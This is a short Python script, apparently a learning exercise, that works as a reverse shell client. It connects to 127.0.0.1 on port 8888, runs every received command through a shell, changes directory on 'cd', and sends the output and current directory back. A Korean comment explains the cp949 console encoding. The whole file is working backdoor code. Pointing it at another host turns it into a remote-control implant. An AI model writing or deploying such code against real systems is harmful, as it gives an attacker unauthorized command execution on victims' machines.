import socket
import os
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 8888

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode('cp949') == "cd":
        os.chdir(data[3:].decode('cp949'))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("cp949"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        # cmd환경에 따라 코텍 다를수 있음 chcp 명령어로 확인 가능(한국어 기본 cp949) https://docs.microsoft.com/ko-kr/windows/win32/intl/code-page-identifiers
        output_str = str(output_byte, "cp949")
        currendWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currendWD))